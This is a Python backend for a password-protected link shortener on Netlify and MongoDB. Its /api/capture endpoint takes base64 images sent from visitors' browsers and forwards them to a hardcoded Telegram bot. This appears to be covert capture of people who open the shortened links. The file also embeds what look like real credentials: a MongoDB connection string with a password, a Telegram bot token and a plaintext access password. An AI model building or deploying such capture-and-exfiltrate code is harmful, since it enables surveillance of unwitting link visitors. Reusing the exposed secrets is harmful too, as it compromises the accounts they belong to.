from http.server import BaseHTTPRequestHandler
import json
import urllib.parse
from datetime import datetime
import secrets
from pymongo import MongoClient
import requests
import base64
import string
import time

# MongoDB connection
MONGO_URI = "mongodb+srv://Anish_Gupta:Anish_Gupta@linkshortner.huk3frj.mongodb.net/?appName=LinkShortner"
client = MongoClient(MONGO_URI)
db = client['link_shortener']
links_collection = db['links']

# Telegram bot
TELEGRAM_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
TELEGRAM_CHAT_ID = "6673230400"
PASSWORD = "@35678"

class Security:
    @staticmethod
    def generate_short_code(length=6):
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(length))

class Database:
    def __init__(self):
        self.links = links_collection
        self.links.create_index('short_code', unique=True)
        self.links.create_index('created_at')
    
    def save_link(self, link_data):
        return self.links.insert_one(link_data)
    
    def get_link(self, short_code):
        return self.links.find_one({'short_code': short_code})
    
    def get_recent_links(self, limit=10):
        cursor = self.links.find().sort('created_at', -1).limit(limit)
        result = []
        for doc in cursor:
            doc['_id'] = str(doc['_id'])
            doc['created_at'] = doc['created_at'].isoformat() if hasattr(doc['created_at'], 'isoformat') else doc['created_at']
            result.append(doc)
        return result
    
    def increment_click(self, short_code):
        return self.links.update_one(
            {'short_code': short_code},
            {'$inc': {'click_count': 1}}
        )

class TelegramBot:
    @staticmethod
    def send_photo(image_data):
        try:
            if ',' in image_data:
                image_data = image_data.split(',')[1]
            
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': ('capture.jpg', base64.b64decode(image_data), 'image/jpeg')}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'Capture: {time.strftime("%Y-%m-%d %H:%M:%S")}'}
            
            response = requests.post(url, files=files, data=data, timeout=5)
            return response.json()
        except Exception as e:
            print(f"Telegram error: {e}")
            return None

class APIHandler(BaseHTTPRequestHandler):
    def _set_headers(self, status=200, content_type='application/json'):
        self.send_response(status)
        self.send_header('Content-Type', content_type)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_OPTIONS(self):
        self._set_headers(200)
    
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        
        if parsed_path.path == '/api/links':
            db = Database()
            links = db.get_recent_links()
            self._set_headers(200)
            self.wfile.write(json.dumps({'links': links}).encode())
        
        elif parsed_path.path.startswith('/api/check-auth'):
            # Simpler auth check - we'll handle in JS
            self._set_headers(200)
            self.wfile.write(json.dumps({'authenticated': False}).encode())
        
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({'error': 'Not found'}).encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
        except:
            data = {}
        
        parsed_path = urllib.parse.urlparse(self.path)
        
        if parsed_path.path == '/api/verify':
            password = data.get('password', '')
            if password == PASSWORD:
                response = {'success': True, 'redirect': '/shortener.html'}
            else:
                response = {'success': False, 'message': 'Incorrect password'}
            
            self._set_headers(200)
            self.wfile.write(json.dumps(response).encode())
        
        elif parsed_path.path == '/api/shorten':
            original_url = data.get('url', '')
            if not original_url:
                response = {'error': 'URL is required'}
                self._set_headers(400)
                self.wfile.write(json.dumps(response).encode())
                return
            
            security = Security()
            short_code = security.generate_short_code()
            db = Database()
            
            link_data = {
                'short_code': short_code,
                'original_url': original_url,
                'created_at': datetime.now(),
                'click_count': 0,
                'created_by': 'team_member'
            }
            
            db.save_link(link_data)
            
            response = {
                'success': True,
                'short_url': f"https://your-site.netlify.app/{short_code}",
                'short_code': short_code
            }
            
            self._set_headers(200)
            self.wfile.write(json.dumps(response).encode())
        
        elif parsed_path.path == '/api/capture':
            image_data = data.get('image', '')
            if image_data:
                TelegramBot.send_photo(image_data)
            
            self._set_headers(200)
            self.wfile.write(json.dumps({'success': True}).encode())
        
        elif parsed_path.path == '/api/verify-redirect':
            password = data.get('password', '')
            if password == PASSWORD:
                response = {'success': True, 'redirect_url': 'https://example.com'}
            else:
                response = {'success': False, 'message': 'Incorrect password'}
            
            self._set_headers(200)
            self.wfile.write(json.dumps(response).encode())
        
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({'error': 'Not found'}).encode())

def handler(event, context):
    # This is for Netlify Functions compatibility
    if event['httpMethod'] == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type'
            },
            'body': ''
        }
    
    path = event['path']
    method = event['httpMethod']
    
    # Initialize components
    db = Database()
    security = Security()
    
    try:
        body = json.loads(event['body']) if event.get('body') else {}
    except:
        body = {}
    
    # Route handling
    if path == '/api/verify' and method == 'POST':
        password = body.get('password', '')
        if password == PASSWORD:
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                'body': json.dumps({
                    'success': True,
                    'redirect': '/shortener.html',
                    'token': secrets.token_hex(16)  # Simple auth token
                })
            }
        else:
            return {
                'statusCode': 401,
                'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
                'body': json.dumps({'success': False, 'message': 'Incorrect password'})
            }
    
    elif path == '/api/shorten' and method == 'POST':
        original_url = body.get('url', '')
        if not original_url:
            return {
                'statusCode': 400,
                'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
                'body': json.dumps({'error': 'URL is required'})
            }
        
        short_code = security.generate_short_code()
        link_data = {
            'short_code': short_code,
            'original_url': original_url,
            'created_at': datetime.now().isoformat(),
            'click_count': 0,
            'created_by': 'team'
        }
        
        db.save_link(link_data)
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({
                'success': True,
                'short_url': f"{event['headers'].get('origin', 'https://your-site.netlify.app')}/{short_code}",
                'short_code': short_code
            })
        }
    
    elif path == '/api/links' and method == 'GET':
        links = db.get_recent_links()
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'links': links})
        }
    
    elif path == '/api/capture' and method == 'POST':
        image_data = body.get('image', '')
        if image_data:
            TelegramBot.send_photo(image_data)
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'success': True})
        }
    
    elif path == '/api/check-auth' and method == 'GET':
        # Simple auth check
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'authenticated': False})
        }
    
    else:
        return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Not found'})
      }
